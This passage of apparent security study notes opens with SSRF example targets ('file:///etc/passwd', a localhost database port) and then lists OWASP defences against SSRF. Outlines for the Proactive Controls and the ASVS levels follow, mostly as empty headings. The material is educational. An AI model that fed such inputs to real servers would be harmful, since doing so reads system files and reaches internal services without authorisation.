		file:///etc/passwd and http://localhost:28017/
	
#### How to prevent [PDF Link](Chapter_3_WAS.pdf#page=169)
##### Developers can prevent SSRF by implementing some or all the following defense in depth controls:
- __From network layer__
	- segment remote resource access functionality in __separate networks to reduce the impact of SSRF__
	- enforce __“deny by default” firewall policies__ or network access control rules to block all but essential intranet traffic - hints:
		- establish an ownership and a lifecycle for firewall rules based on applications.
		- log all accepted and blocked network flows on firewalls (see A09:2021-Security Logging and Monitoring Failures)
- From application layer
	- __sanitize and validate all client-supplied input data__
	- enforce the URL schema, port, and destination with a __positive allow list__
	- __do not send raw responses to clients__
	- __disable HTTP redirections__
	- be aware of the URL consistency to avoid attacks such as DNS rebinding and “time of check, time of use” (TOCTOU) race conditions

#### References
[PDF Link](Chapter_3_WAS.pdf#page=171)

### Further risks (from earlier OWASP top 10 lists) 
[PDF Link](Chapter_3_WAS.pdf#page=174)
[OWASP Top ten](https://owasp.org/Top10/A11_2021-Next_Steps/)

#### Common vulnerabilities
#### Example Attacks
#### How to prevent 

## Chapter 4

### OWASP Top Ten Proactive Controls (OPCs)
	[[#C1 - Define Security Requirements]]
	[[#C2 - Leverage Security Frameworks and Libraries]]
	[[#C3 - Secure Database Access  ]]
	[[#C4 - Encode and Escape Data  ]]
	[[#C5 - Validate All Inputs  ]]
	[[#C6 - Implement Digital Identity]]
	[[#C7 - Enforce Access Controls  ]]
	[[#C8 - Protect Data Everywhere ]] 
	[[#C9 - Implement Security Logging and Monitoring]]
	[[#C10 - Handle All Errors and Exceptions]]


### C1 - Define Security Requirements  
### C2 - Leverage Security Frameworks and Libraries
### C3 - Secure Database Access  
### C4 - Encode and Escape Data  
### C5 - Validate All Inputs  
### C6 - Implement Digital Identity  
### C7 - Enforce Access Controls  
### C8 - Protect Data Everywhere  
### C9 - Implement Security Logging and Monitoring
### C10 - Handle All Errors and Exceptions

## Chapter 5

### Application Security Verification Standard (ASVS)
	[[#Level 1: Opportunistic (Minimum Requirement)]]
	[[#Level 2: Standard (Normal Requirements)]]
	[[#Level 3: Advanced (Maximum Requirements)]]
	[[#Applying ASVS in Practice]]


### Level 1: Opportunistic (Minimum Requirement)
### Level 2: Standard (Normal Requirements)
### Level 3: Advanced (Maximum Requirements)
### Applying ASVS in Practice
